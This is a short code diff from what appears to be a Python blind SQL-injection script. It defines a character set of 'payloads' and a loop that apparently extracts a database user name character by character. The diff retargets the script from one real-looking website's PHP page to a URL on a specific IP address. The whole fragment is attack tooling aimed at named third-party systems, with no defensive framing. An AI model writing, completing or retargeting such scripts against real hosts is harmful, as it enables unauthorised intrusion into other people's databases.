@@ -4,7 +4,7 @@ import time
 import requests
 
 payloads = '0123456789abcdefghijklmnopqrstuvwxyz@_-.'
-url = 'http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow='
+url = 'http://202.120.163.39/index.php?app=Home&g=Index&m=Index&a=index&wa=3&cat_id=43&id='
 user = ''
 
 for num in xrange(1,11):
